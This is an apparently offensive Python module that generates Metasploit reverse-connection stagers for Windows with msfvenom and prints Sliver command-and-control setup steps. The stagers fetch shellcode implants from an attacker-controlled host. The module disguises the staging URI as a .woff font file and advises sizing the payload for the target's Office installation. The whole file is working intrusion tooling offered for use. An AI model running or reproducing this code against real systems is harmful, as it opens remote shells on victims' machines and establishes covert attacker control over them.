import subprocess
import sys
import os
import random
import string
from ..core.utils import console

def generate(lhost, lport, arch="x64", proto="tcp"):
    """
    Generates a Metasploit 'custom' stager compatible with Sliver's stage-listener.
    """
    arch_path = "x64/" if arch == "x64" else ""
    
    if proto == "tcp":
        msf_payload = f"windows/{arch_path}custom/reverse_tcp"
    elif proto == "http":
        msf_payload = f"windows/{arch_path}custom/reverse_winhttp"
    elif proto == "https":
        msf_payload = f"windows/{arch_path}custom/reverse_winhttps"
    else:
        msf_payload = f"windows/{arch_path}custom/reverse_tcp"

    cmd = ["msfvenom", "-p", msf_payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread"]
    
    if proto in ["http", "https"]:
        rand_uri = "/" + "".join(random.choice(string.ascii_lowercase) for _ in range(8)) + ".woff"
        cmd.append(f"LURI={rand_uri}")

    cmd.extend(["-f", "raw"])
    
    console.print(f"[bold blue][*] Generating Sliver CUSTOM stager ({msf_payload})...[/bold blue]")
    
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        console.print("[bold red][-] Error running msfvenom:[/bold red]")
        console.print(result.stderr.decode())
        sys.exit(1)
        
    return result.stdout

def get_sliver_instructions(lhost, lport, proto="tcp"):
    """
    Returns a formatted string with instructions to catch the session in Sliver.
    """
    # Force TCP in instructions if HTTP failed for the user previously
    if proto != "tcp":
        console.print("[bold yellow][!] Note: If your Sliver build lacks HTTP staging, use --proto tcp[/bold yellow]")

    instr = f"""
[bold yellow]Sliver Session Setup (Metasploit Compatibility):[/bold yellow]

[bold cyan]1. Create Profiles (One for each architecture):[/bold cyan]
   [bold white]profiles new --mtls {lhost} --arch amd64 --format shellcode sliver_x64[/bold white]
   [bold white]profiles new --mtls {lhost} --arch 386 --format shellcode sliver_x86[/bold white]

[bold cyan]2. Start Stage Listeners (Match your --lport {lport}):[/bold cyan]
   [italic]Note: You can only run one listener per port. Most Office installs are x86.[/italic]
   [bold white]stage-listener --url tcp://{lhost}:{lport} --profile sliver_x86 --prepend-size[/bold white]
   [white](OR use --profile sliver_x64 if you are CERTAIN the target Office is 64-bit)[/white]

[bold cyan]3. Verify:[/bold cyan]
   [bold white]jobs[/bold white]
"""
    return instr
